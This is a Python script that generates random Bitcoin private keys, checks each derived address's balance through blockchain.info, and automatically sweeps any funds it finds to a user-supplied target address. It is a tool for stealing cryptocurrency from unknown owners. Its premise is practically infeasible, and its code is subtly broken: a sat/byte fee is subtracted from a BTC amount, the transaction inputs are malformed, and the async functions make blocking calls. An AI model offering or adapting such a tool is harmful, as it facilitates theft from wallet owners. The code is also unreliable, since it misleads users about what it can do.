import os
import ecdsa
import hashlib
import base58
import requests
from bitcoinlib.transactions import Transaction
from bitcoinlib.keys import Key
from colorama import Fore, Back, Style, init
from tqdm import tqdm
import asyncio
import time

init(autoreset=True)

def generate_private_key():
    return os.urandom(32)

def private_key_to_public_key(private_key):
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    return b'\x04' + vk.to_string()

def public_key_to_address(public_key):
    sha256 = hashlib.sha256(public_key).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256)
    hashed_public_key = ripemd160.digest()
    network_byte = b'\x00' + hashed_public_key
    checksum = hashlib.sha256(hashlib.sha256(network_byte).digest()).digest()[:4]
    binary_address = network_byte + checksum
    return base58.b58encode(binary_address).decode('utf-8')

async def check_balance(address):
    url = f"https://blockchain.info/balance?active={address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            balance = data.get(address, {}).get("final_balance", 0)
            return balance / 1e8
        else:
            return None
    except Exception as e:
        return None

def get_dynamic_fee():
    try:
        fee_url = "https://mempool.space/api/v1/fees/recommended"
        response = requests.get(fee_url)
        if response.status_code == 200:
            fees = response.json()
            return fees['high']
        else:
            print(Fore.RED + "Failed to fetch dynamic fee rates")
            return 0.0001
    except Exception as e:
        print(Fore.RED + f"Error fetching fee data: {e}")
        return 0.0001

def broadcast_transaction(raw_tx):
    try:
        payload = {
            "tx": raw_tx
        }
        headers = {
            'Content-Type': 'application/json'
        }

        response = requests.post('https://api.blockcypher.com/v1/btc/main/txs/send', json=payload, headers=headers)

        if response.status_code == 201:
            tx_id = response.json().get('tx_hash')
            print(Fore.GREEN + f"Transaction successfully broadcasted. TXID: {tx_id}")
            return tx_id
        else:
            print(Fore.RED + f"Failed to broadcast transaction. Error: {response.text}")
            return None
    except Exception as e:
        print(Fore.RED + f"Error broadcasting transaction: {e}")
        return None

def send_funds(private_key, source_address, target_address, amount):
    fee_rate = get_dynamic_fee()
    print(Fore.YELLOW + f"Using dynamic fee rate: {fee_rate} sat/byte")

    try:
        key = Key(import_key=private_key.hex())
        tx = Transaction()
        tx.add_input(source_address, amount, key.wif())
        tx.add_output(target_address, amount - fee_rate)
        tx.sign()

        raw_tx = tx.raw_hex()

        tx_id = broadcast_transaction(raw_tx)

        return tx_id
    except Exception as e:
        print(Fore.RED + f"Failed to create/send transaction: {e}")
        return None

def display_wallet_info(private_key, public_key, address, balance):
    print(Fore.CYAN + Style.BRIGHT + "\nGenerated Bitcoin Wallet:")
    print(Fore.GREEN + f"Address: {address}")
    print(Fore.GREEN + f"Private Key: {private_key.hex()}")
    print(Fore.GREEN + f"Public Key: {public_key.hex()}")
    if balance is not None:
        if balance > 0:
            print(Fore.YELLOW + f"Balance: {balance:.8f} BTC (Funds Found!)")
            print("")
        else:
            print(Fore.RED + "Balance: 0 BTC (No Funds)")
            print("")
    else:
        print(Fore.RED + "Balance: Error fetching balance")

async def main():
    target_address = input(Fore.MAGENTA + "Enter the target Bitcoin address to send funds to: ").strip()
    if not target_address:
        print(Fore.RED + "Invalid address!")
        return

    print(Fore.MAGENTA + "Starting wallet generation and checking...\n")
    time.sleep(1)

    pbar = tqdm(total=0, desc="Searching for a wallet with funds...", unit=" wallets", ncols=100, colour='cyan', dynamic_ncols=True)

    while True:
        private_key = generate_private_key()
        public_key = private_key_to_public_key(private_key)
        address = public_key_to_address(public_key)

        balance = await check_balance(address)

        display_wallet_info(private_key, public_key, address, balance)

        if balance and balance > 0:
            print(Fore.GREEN + "\n!!! Found a wallet with funds! !!!")
            print(Fore.GREEN + f"Attempting to send {balance:.8f} BTC to {target_address}")
            
            tx_id = send_funds(private_key, address, target_address, balance)
            if tx_id:
                print(Fore.GREEN + f"Transaction sent successfully! TXID: {tx_id}")
            else:
                print(Fore.RED + "Failed to send transaction!")
            break

        pbar.update(1)

if __name__ == "__main__":
    asyncio.run(main())
